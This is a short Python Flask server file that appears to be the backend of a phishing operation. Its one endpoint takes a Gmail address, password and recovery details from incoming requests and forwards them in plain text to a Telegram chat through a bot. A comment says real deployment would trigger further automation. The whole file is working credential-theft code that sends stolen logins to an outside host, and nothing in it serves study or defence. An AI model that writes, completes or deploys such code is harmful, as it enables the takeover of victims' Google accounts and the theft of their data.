
from flask import Flask, request
import telegram
import os

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

bot = telegram.Bot(token=BOT_TOKEN)

@app.route('/send_gmail_info', methods=['POST'])
def send_gmail_info():
    data = request.json
    gmail = data.get("gmail")
    password = data.get("password")
    recovery = data.get("recovery")

    # Placeholder logic - this would trigger automation in real deployment
    bot.send_message(chat_id=CHAT_ID, text=f"📨 Gmail Info Received:\n📧 {gmail}\n🔐 {password}\n🔁 {recovery}")

    return {"status": "received"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
